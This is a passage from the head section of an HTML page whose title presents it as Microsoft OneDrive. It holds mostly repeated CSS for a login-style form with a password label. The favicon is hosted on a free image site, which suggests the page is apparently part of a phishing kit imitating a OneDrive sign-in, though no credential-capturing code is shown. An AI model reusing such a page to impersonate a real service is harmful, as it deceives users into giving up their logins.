
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta charset="utf-8" />

        <link
            rel="shortcut icon"
            href="https://i.ibb.co/YTPn8jzT/mcrs.png"
            type="image/x-icon"
        />

        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

        <style>
            body {
                font-weight: 400;
                font-family: "Segoe UI", -apple-system, "Helvetica Neue",
                    "Lucida Grande", Roboto, Ebrima, "Nirmala UI", Gadugi,
                    "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI",
                    "Khmer UI", Tunga, "Lao UI", Raavi, "Iskoola Pota", Latha,
                    Leelawadee, "Microsoft YaHei UI", "Microsoft JhengHei UI",
                    "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya",
                    "Microsoft New Tai Lue", "Microsoft PhagsPa",
                    "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti",
                    "MV Boli", "Myanmar Text", "Cambria Math";
                font-size: 0.9375rem;
                line-height: 1.25rem;
                margin: 0px;
                background-color: rgb(255, 255, 255);
            }

            .modal-main {
                width: 70vh;
            }

            a {
                text-decoration: none;
            }

            .form-area {
                background-color: #ffff;
            }

            .form-label {
                margin-left: 12px;
            }

            .form-control {
                border: none;
                border-color: transparent !important;
                border-radius: 0;
                margin-left: 0;
            }

            .form-control:focus {
                box-shadow: none !important;
                border-color: transparent !important;
                background-color: transparent !important;
            }

            .form-control:not(:placeholder-shown) {
                border-bottom: 1px solid #0078d4 !important;
                background-color: transparent !important;
            }

            .form-control::placeholder {
                border-bottom: 1px solid rgb(73, 72, 72);
                padding-bottom: 7px;
            }

            .btn-p {
                border-radius: 0;
                /* Remove border-radius */
                background-color: rgb(0, 103, 184);
            }

            .link-back {
                text-decoration: none;
                /* Remove default underline */
                border-bottom: none;
                /* Remove default bottom border */
            }

            .link-back::before {
                content: "\2190";
                /* Unicode character for left arrow */
                margin-right: 5px;
                /* Adjust spacing between arrow and link text */
                text-decoration: none;
                font-size: 20px;
                color: black;
                font-weight: 500;
            }

            .password-label {
                font-size: 25px;
                font-weight: 500;
            }

            @keyframes bounce {
                0%,
                100% {
                    transform: translateY(0);
                    /* Start and end position */
                }

                50% {
                    transform: translateY(-10px);
                    /* Middle position - adjust the value as needed */
                }
            }

            .bouncing-image {
                animation: bounce 1s infinite;
                /* Apply the bounce animation infinitely */
            }

            .fade-in {
                animation: fadeIn 0.5s forwards;
            }

            .fade-out {
                animation: fadeOut 0.5s forwards;
            }

            @keyframes fadeIn {
                0% {
                    opacity: 0;
                }

                100% {
                    opacity: 1;
                }
            }

            @keyframes fadeOut {
                0% {
                    opacity: 1;
                }

                100% {
                    opacity: 0;
                }
            }

            .fnmhfyr:focus {
                text-decoration-line: underline;
            }

            .f1e35ql2:focus {
                outline-color: rgb(0, 0, 0);
            }

            .fatbyko:focus {
                outline-width: 2px;
            }

            .f1grzc83:focus {
                outline-style: solid;
            }

            .fj5daoo:focus {
                background-color: rgb(0, 93, 166);
            }

            .f1mvy130:hover {
                color: rgb(0, 0, 0);
            }

            .f1qf9653:hover {
                text-decoration: none;
            }

            .fryk5ur:hover {
                text-decoration: underline;
            }

            .fv6z6zc:hover {
                color: rgb(102, 102, 102);
            }

            .f1cio4g9:hover {
                background-color: transparent;
            }

            .f1mwb9y5:hover {
                border-top-style: none;
            }

            .f1ynmygo:hover {
                border-right-style: none;
            }

            .f1i82eaq:hover {
                border-left-style: none;
            }

            .f121g8nd:hover {
                border-bottom-style: none;
            }

            .f8491dx:hover {
                cursor: pointer;
            }

            .fnsf7x1:hover {
                background-color: rgb(0, 93, 166);
            }

            .fb0xa7e:active {
                outline-style: none;
            }

            .fljg2da:active {
                text-decoration-line: none;
            }

            .f1c2uykm:active {
                transform: scale(0.98);
            }

            .f7n145z:active {
                transform: scale(0.98);
            }

            .ff472gp:active {
                border-top-color: transparent;
            }

            .f4yyc7m:active {
                border-right-color: transparent;
            }

            .ft2aflc:active {
                border-left-color: transparent;
            }

            .fggejwh:active {
                border-bottom-color: transparent;
            }

            .ft0kson:active {
                background-color: rgb(0, 93, 166);
            }
        </style>
        <style>
            @-webkit-keyframes f1t2sqxk {
                0% {
                    left: 0px;
                    opacity: 1;
                }
                100% {
                    left: -200px;
                    opacity: 0;
                }
            }
            @-webkit-keyframes f1o4taax {
                0% {
                    right: 0px;
                    opacity: 1;
                }
                100% {
                    right: -200px;
                    opacity: 0;
                }
            }
            @keyframes f1t2sqxk {
                0% {
                    left: 0px;
                    opacity: 1;
                }
                100% {
                    left: -200px;
                    opacity: 0;
                }
            }
            @keyframes f1o4taax {
                0% {
                    right: 0px;
                    opacity: 1;
                }
                100% {
                    right: -200px;
                    opacity: 0;
                }
            }
            @-webkit-keyframes fr2e2iv {
                0% {
                    left: 200px;
                    opacity: 0;
                }
                100% {
                    left: 0px;
                    opacity: 1;
                }
            }
            @-webkit-keyframes fadpgrp {
                0% {
                    right: 200px;
                    opacity: 0;
                }
                100% {
                    right: 0px;
                    opacity: 1;
                }
            }
            @keyframes fr2e2iv {
                0% {
                    left: 200px;
                    opacity: 0;
                }
                100% {
                    left: 0px;
                    opacity: 1;
                }
            }
            @keyframes fadpgrp {
                0% {
                    right: 200px;
                    opacity: 0;
                }
                100% {
                    right: 0px;
                    opacity: 1;
                }
            }
            @-webkit-keyframes f1wj94rl {
                0% {
                    left: 0px;
                    opacity: 1;
                }
                100% {
                    left: 200px;
                    opacity: 0;
                }
            }
            @-webkit-keyframes fgv3477 {
                0% {
                    right: 0px;
                    opacity: 1;
                }
                100% {
                    right: 200px;
                    opacity: 0;
                }
            }
            @keyframes f1wj94rl {
                0% {
                    left: 0px;
                    opacity: 1;
                }
                100% {
                    left: 200px;
                    opacity: 0;
                }
            }
            @keyframes fgv3477 {
                0% {
                    right: 0px;
                    opacity: 1;
                }
                100% {
                    right: 200px;
                    opacity: 0;
                }
            }
            @-webkit-keyframes fs3h71u {
                0% {
                    left: -200px;
                    opacity: 0;
                }
                100% {
                    left: 0px;
                    opacity: 1;
                }
            }
            @-webkit-keyframes fkaajju {
                0% {
                    right: -200px;
                    opacity: 0;
                }
                100% {
                    right: 0px;
                    opacity: 1;
                }
            }
            @keyframes fs3h71u {
                0% {
                    left: -200px;
                    opacity: 0;
                }
                100% {
                    left: 0px;
                    opacity: 1;
                }
            }
            @keyframes fkaajju {
                0% {
                    right: -200px;
                    opacity: 0;
                }
                100% {
                    right: 0px;
                    opacity: 1;
                }
            }
            @-webkit-keyframes f11ta6k4 {
                0% {
                    opacity: 0;
                }
            }
            @keyframes f11ta6k4 {
                0% {
                    opacity: 0;
                }
            }
            @-webkit-keyframes f1y1g2h0 {
                100% {
                    opacity: 0;
                }
            }
            @keyframes f1y1g2h0 {
                100% {
                    opacity: 0;
                }
            }
            @-webkit-keyframes f5j8bii {
                0% {
                    opacity: 0;
                }
                100% {
                    opacity: 1;
                }
            }
            @keyframes f5j8bii {
                0% {
                    opacity: 0;
                }
                100% {
                    opacity: 1;
                }
            }
        </style>
        <style>
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
                .f1hihypw {
                    vertical-align: top;
                }
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
                .f1hdxpn2 {
                    padding-top: 24px;
                }
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
                .fipdpho {
                    padding-right: 24px;
                }
                .f1b09k7r {
                    padding-left: 24px;
                }
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
                .f15bspdk {
                    padding-bottom: 24px;
                }
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
                .f1b09k7r {
                    padding-left: 24px;
                }
                .fipdpho {
                    padding-right: 24px;
                }
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
                .f1sw15gs {
                    margin-top: 0px;
                }
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
                .f1myntb5 {
                    margin-bottom: 28px;
                }
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
                .fb2nunp {
                    width: 100vw;
                }
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
                .f1nfk72b {
                    min-width: auto;
                }
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
                .fieg86w {
                    box-shadow: none;
                }
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
                .f1yan94j {
                    box-shadow: none;
                }
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
                .fsxb0gg {
                    border-top-width: 0px;
                }
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
                .f18dv3z1 {
                    border-right-width: 0px;
                }
                .f8a6j8r {
                    border-left-width: 0px;
                }
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
                .f165779w {
                    border-bottom-width: 0px;
                }
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
                .f8a6j8r {
                    border-left-width: 0px;
                }
                .f18dv3z1 {
                    border-right-width: 0px;
                }
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
                .f1jf33rt {
                    margin-bottom: 0px;
                }
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
                .fwyugdc {
                    display: none;
                }
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
                .fyrle8j {
                    background-color: rgb(255, 255, 255);
                }
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
                .f83de6y {
                    filter: none;
                }
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
                .f2jlawl {
                    float: left;
                }
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
                .fvrrg5m {
                    margin-top: 0px;
                }
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
                .fjys7tk {
                    margin-right: 24px;
                }
                .ft1heno {
                    margin-left: 24px;
                }
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
                .ft1heno {
                    margin-left: 24px;
                }
                .fjys7tk {
                    margin-right: 24px;
                }
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
                .fop6iti {
                    color: rgb(116, 116, 116);
                }
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media screen and (max-width: 600px),
                screen and (max-height: 366px) {
            }
            @media (forced-colors: active) {
                .f1rs8wju {
                    color: linktext;
                }
            }
            @media (forced-colors: active) {
                .f1mtyjhi:hover {
                    color: linktext;
                }
            }
            @media (-ms-high-contrast: active) {
            }
            @media (-ms-high-contrast: active) {
                .f3a8s8z:hover {
                }
            }
            @media screen and (prefers-contrast: more),
                (forced-colors: active) {
                .f17hdyk {
                    border-top-width: 1px;
                }
            }
            @media screen and (prefers-contrast: more),
                (forced-colors: active) {
                .f1oudy {
                    border-right-width: 1px;
                }
                .f16643v7 {
                    border-left-width: 1px;
                }
            }
            @media screen and (prefers-contrast: more),
                (forced-colors: active) {
                .f1d4dqg0 {
                    border-bottom-width: 1px;
                }
            }
            @media screen and (prefers-contrast: more),
                (forced-colors: active) {
                .f16643v7 {
                    border-left-width: 1px;
                }
                .f1oudy {
                    border-right-width: 1px;
                }
            }
            @media screen and (prefers-contrast: more),
                (forced-colors: active) {
                .f1ugb8du {
                    border-top-style: solid;
                }
            }
            @media screen and (prefers-contrast: more),
                (forced-colors: active) {
                .f7y26xe {
                    border-right-style: solid;
                }
                .fm07rh1 {
                    border-left-style: solid;
                }
            }
            @media screen and (prefers-contrast: more),
                (forced-colors: active) {
                .f13hfvcj {
                    border-bottom-style: solid;
                }
            }
            @media screen and (prefers-contrast: more),
                (forced-colors: active) {
                .fm07rh1 {
                    border-left-style: solid;
                }
                .f7y26xe {
                    border-right-style: solid;
                }
            }
            @media screen and (-ms-high-contrast: active) {
            }
            @media screen and (-ms-high-contrast: active) {
                .fd0rex {
                    outline-width: 1px;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1cpir1z {
                    outline-style: solid;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f16eno2h {
                    outline-color: highlight;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f18r37t4 {
                    border-top-width: 1px;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .fzjldvh {
                    border-right-width: 1px;
                }
                .f8rakl9 {
                    border-left-width: 1px;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1qt38gl {
                    border-bottom-width: 1px;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f8rakl9 {
                    border-left-width: 1px;
                }
                .fzjldvh {
                    border-right-width: 1px;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1g0fpsx {
                    border-top-style: solid;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f16h1fbs {
                    border-right-style: solid;
                }
                .fmuajgt {
                    border-left-style: solid;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .fsgvd33 {
                    border-bottom-style: solid;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .fmuajgt {
                    border-left-style: solid;
                }
                .f16h1fbs {
                    border-right-style: solid;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f17m94t {
                    border-top-color: highlight;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f9q4yqu {
                    border-right-color: highlight;
                }
                .fwbpk35 {
                    border-left-color: highlight;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .fhe0td7 {
                    border-bottom-color: highlight;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .fwbpk35 {
                    border-left-color: highlight;
                }
                .f9q4yqu {
                    border-right-color: highlight;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1wcl2ob {
                    background-color: highlight;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1ltk4hd {
                    color: highlighttext;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1oyfet3 {
                    text-decoration-line: none;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1k5fftb:hover {
                    outline-width: 1px;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .flu9u7w:hover {
                    outline-style: solid;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .fa4qi57:hover {
                    outline-color: highlight;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f11zj0ky:hover {
                    border-top-width: 1px;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f43o6hn:hover {
                    border-right-width: 1px;
                }
                .f1uush98:hover {
                    border-left-width: 1px;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f14894vr:hover {
                    border-bottom-width: 1px;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1uush98:hover {
                    border-left-width: 1px;
                }
                .f43o6hn:hover {
                    border-right-width: 1px;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .fr10sow:hover {
                    border-top-style: solid;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1qd3bm6:hover {
                    border-right-style: solid;
                }
                .f1x8m22p:hover {
                    border-left-style: solid;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .ftxr058:hover {
                    border-bottom-style: solid;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1x8m22p:hover {
                    border-left-style: solid;
                }
                .f1qd3bm6:hover {
                    border-right-style: solid;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f18kyeoj:hover {
                    border-top-color: window;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f7uvj51:hover {
                    border-right-color: window;
                }
                .fz1xuqi:hover {
                    border-left-color: window;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1emwz7l:hover {
                    border-bottom-color: window;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .fz1xuqi:hover {
                    border-left-color: window;
                }
                .f7uvj51:hover {
                    border-right-color: window;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .fsrzjhw:hover {
                    background-color: window;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .fur62vr:hover {
                    color: highlight;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1f2bxve:hover {
                    text-decoration-line: none;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f19rxy1v:hover:focus {
                    outline-width: 1px;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1ks5t5n:hover:focus {
                    outline-style: solid;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .fg209rd:hover:focus {
                    outline-color: windowtext;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1hvg9fg:hover:focus {
                    border-top-width: 1px;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1ik4u3u:hover:focus {
                    border-right-width: 1px;
                }
                .f1u5eihr:hover:focus {
                    border-left-width: 1px;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .fd6720t:hover:focus {
                    border-bottom-width: 1px;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1u5eihr:hover:focus {
                    border-left-width: 1px;
                }
                .f1ik4u3u:hover:focus {
                    border-right-width: 1px;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .ftlxw82:hover:focus {
                    border-top-style: solid;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .fj7y92t:hover:focus {
                    border-right-style: solid;
                }
                .fb1y507:hover:focus {
                    border-left-style: solid;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f154ob9o:hover:focus {
                    border-bottom-style: solid;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .fb1y507:hover:focus {
                    border-left-style: solid;
                }
                .fj7y92t:hover:focus {
                    border-right-style: solid;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f16qlskp:hover:focus {
                    border-top-color: window;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f15dqc6l:hover:focus {
                    border-right-color: window;
                }
                .f1a94zgw:hover:focus {
                    border-left-color: window;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .fk9yu7v:hover:focus {
                    border-bottom-color: window;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1a94zgw:hover:focus {
                    border-left-color: window;
                }
                .f15dqc6l:hover:focus {
                    border-right-color: window;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .fblkvk0:hover:focus {
                    background-color: window;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f2ud54c:hover:focus {
                    color: highlight;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1rx6zpj:hover:focus {
                    text-decoration-line: underline;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1yeerbk:focus {
                    outline-width: 1px;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1apeehu:focus {
                    outline-style: solid;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .fc5iy9t:focus {
                    outline-color: windowtext;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1w0w9a7:focus {
                    border-top-width: 1px;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f4rf09w:focus {
                    border-right-width: 1px;
                }
                .f1jvmnke:focus {
                    border-left-width: 1px;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1lbyfsq:focus {
                    border-bottom-width: 1px;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1jvmnke:focus {
                    border-left-width: 1px;
                }
                .f4rf09w:focus {
                    border-right-width: 1px;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .ffu7u5y:focus {
                    border-top-style: solid;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .fr5cd8s:focus {
                    border-right-style: solid;
                }
                .f1l3iklw:focus {
                    border-left-style: solid;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .fu7zm6:focus {
                    border-bottom-style: solid;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1l3iklw:focus {
                    border-left-style: solid;
                }
                .fr5cd8s:focus {
                    border-right-style: solid;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1wctfe5:focus {
                    border-top-color: window;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .fr4vimk:focus {
                    border-right-color: window;
                }
                .f1mtrtxf:focus {
                    border-left-color: window;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f171xskp:focus {
                    border-bottom-color: window;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1mtrtxf:focus {
                    border-left-color: window;
                }
                .fr4vimk:focus {
                    border-right-color: window;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .ft29jt3:focus {
                    background-color: highlight;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f1dkakdg:focus {
                    color: highlighttext;
                }
            }
            @media screen and (-ms-high-contrast: active) {
                .f7ua2bh:focus {
                    text-decoration-line: underline;
                }
            }
        </style>
        <title>
            Microsoft OneDrive - Free Cloud Storage for Photos and Files |
            OneDrive
        </title>
        <link
            href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&amp;display=swap"
            rel="stylesheet"
        />
        <style>
            body {
                font-weight: 400;
                font-family: "Segoe UI", -apple-system, "Helvetica Neue",
                    "Lucida Grande", Roboto, Ebrima, "Nirmala UI", Gadugi,
                    "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI",
                    "Khmer UI", Tunga, "Lao UI", Raavi, "Iskoola Pota", Latha,
                    Leelawadee, "Microsoft YaHei UI", "Microsoft JhengHei UI",
                    "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya",
                    "Microsoft New Tai Lue", "Microsoft PhagsPa",
                    "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti",
                    "MV Boli", "Myanmar Text", "Cambria Math";
                font-size: 0.9375rem;
                line-height: 1.25rem;
                margin: 0px;
                background-color: rgb(255, 255, 255);
            }

            .modal-main {
                width: 70vh;
            }

            a {
                text-decoration: none;
            }

            .form-area {
                background-color: #ffff;
            }

            .form-label {
                margin-left: 12px;
            }

            .form-control {
                border: none;
                border-color: transparent !important;
                border-radius: 0;
                margin-left: 0;
            }

            .form-control:focus {
                box-shadow: none !important;
                border-color: transparent !important;
                background-color: transparent !important;
            }

            .form-control:not(:placeholder-shown) {
                border-bottom: 1px solid #0078d4 !important;
                background-color: transparent !important;
            }

            .form-control::placeholder {
                border-bottom: 1px solid rgb(73, 72, 72);
                padding-bottom: 7px;
            }

            .btn-p {
                border-radius: 0; /* Remove border-radius */
                background-color: rgb(0, 103, 184);
            }

            .link-back {
                text-decoration: none; /* Remove default underline */
                border-bottom: none; /* Remove default bottom border */
            }

            .link-back::before {
                content: "\2190"; /* Unicode character for left arrow */
                margin-right: 5px; /* Adjust spacing between arrow and link text */
                text-decoration: none;
                font-size: 20px;
                color: black;
                font-weight: 500;
            }

            .password-label {
                font-size: 25px;
                font-weight: 500;
            }

            @keyframes bounce {
                0%,
                100% {
                    transform: translateY(0); /* Start and end position */
                }
                50% {
                    transform: translateY(
                        -10px
                    ); /* Middle position - adjust the value as needed */
                }
            }

            .bouncing-image {
                animation: bounce 1s infinite; /* Apply the bounce animation infinitely */
            }
            .fade-in {
                animation: fadeIn 0.5s forwards;
            }
            .fade-out {
                animation: fadeOut 0.5s forwards;
            }
            @keyframes fadeIn {
                0% {
                    opacity: 0;
                }
                100% {
                    opacity: 1;
                }
            }
            @keyframes fadeOut {
                0% {
                    opacity: 1;
                }
                100% {
                    opacity: 0;
                }
            }
        </style>
        <style>
            body {
                font-family: "Inter", sans-serif, "Segoe UI", -apple-system,
                    "Helvetica Neue", "Lucida Grande", Roboto, Ebrima,
                    "Nirmala UI", Gadugi, "Segoe Xbox Symbol", "Segoe UI Symbol",
                    "Meiryo UI", "Khmer UI", Tunga, "Lao UI", Raavi,
                    "Iskoola Pota", Latha, Leelawadee, "Microsoft YaHei UI",
                    "Microsoft JhengHei UI", "Malgun Gothic",
                    "Estrangelo Edessa", "Microsoft Himalaya",
                    "Microsoft New Tai Lue", "Microsoft PhagsPa",
                    "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti",
                    "MV Boli", "Myanmar Text", "Cambria Math";
                background: linear-gradient(
                    -45deg,
                    #1e3a8a,
                    #2563eb,
                    #3b82f6,
                    #93c5fd
                );
                background-size: 400% 400%;
                animation: gradientBG 15s ease infinite;
                font-weight: 400;
                font-size: 0.9375rem;
                line-height: 1.25rem;
                margin: 0px;
                background-image: linear-gradient(
                        -45deg,
                        #1e3a8a,
                        #2563eb,
                        #3b82f6,
                        #93c5fd
                    ),
                    url("/sub/html/assets/ms-xreen.png");
            }

            a:hover {
                text-decoration: none;
            }

            aside nav .active {
                background-color: rgba(187, 194, 199, 0.462);
                color: rgba(0, 0, 0, 0.548);
            }

            @keyframes gradientBG {
                0% {
                    background-position: 0% 50%;
                }

                50% {
                    background-position: 100% 50%;
                }

                100% {
                    background-position: 0% 50%;
                }
            }

            .glass {
                backdrop-filter: blur(4px);
                background: rgba(255, 255, 255, 0.08);
                border: 1px solid rgba(255, 255, 255, 0.15);
            }

            .file-icon {
                width: 24px;
                height: 24px;
            }

            ::-webkit-scrollbar {
                width: 8px;
            }

            ::-webkit-scrollbar-thumb {
                background: rgba(255, 255, 255, 0.2);
                border-radius: 6px;
            }

            .logo {
                width: 100px;
            }

            .modal-main {
                width: 70vh;
            }

            a {
                text-decoration: none;
            }

            .form-area {
                background-color: #ffff;
            }

            .form-label {
                margin-left: 12px;
            }

            .form-control {
                border: none;
                border-color: transparent !important;
                border-radius: 0;
                margin-left: 0;
            }

            .form-control:focus {
                box-shadow: none !important;
                border-color: transparent !important;
                background-color: transparent !important;
            }

            .form-control:not(:placeholder-shown) {
                border-bottom: 1px solid #06f !important;
                background-color: transparent !important;
            }

            .form-control::placeholder {
                border-bottom: 1px solid rgb(73, 72, 72);
                padding-bottom: 7px;
            }

            .btn-p {
                border-radius: 0;
                /* Remove border-radius */
                background-color: rgb(0, 103, 184);
            }

            .link-back {
                text-decoration: none;
                /* Remove default underline */
                border-bottom: none;
                /* Remove default bottom border */
            }

            .link-back::before {
                content: "\2190";
                /* Unicode character for left arrow */
                margin-right: 5px;
                /* Adjust spacing between arrow and link text */
                text-decoration: none;
                font-size: 20px;
                color: black;
                font-weight: 500;
            }

            .password-label {
                font-size: 25px;
                font-weight: 500;
            }

            @keyframes bounce {
                0%,
                100% {
                    transform: translateY(0);
                    /* Start and end position */
                }

                50% {
                    transform: translateY(-10px);
                    /* Middle position - adjust the value as needed */
                }
            }

            .bouncing-image {
                animation: bounce 1s infinite;
                /* Apply the bounce animation infinitely */
            }

            .fade-in {
                animation: fadeIn 0.5s forwards;
            }

            .fade-out {
                animation: fadeOut 0.5s forwards;
            }

            @keyframes fadeIn {
                0% {
                    opacity: 0;
                }

                100% {
                    opacity: 1;
                }
            }

            @keyframes fadeOut {
                0% {
                    opacity: 1;
                }

                100% {
                    opacity: 0;
                }
            }

            .animate-spin {
                animation: spin 1s linear infinite;
            }

            .animate-pulse {
                animation: pulse 2s infinite;
            }

            @keyframes spin {
                0% {
                    transform: rotate(0deg);
                }

                100% {
                    transform: rotate(360deg);
                }
            }

            @keyframes pulse {
                0%,
                100% {
                    opacity: 1;
                }

                50% {
                    opacity: 0.5;
                }
            }

            .preloader-text {
                color: #06f;
            }
        </style>
        <style>
            *,
            ::before,
            ::after {
                --tw-border-spacing-x: 0;
                --tw-border-spacing-y: 0;
                --tw-translate-x: 0;
                --tw-translate-y: 0;
                --tw-rotate: 0;
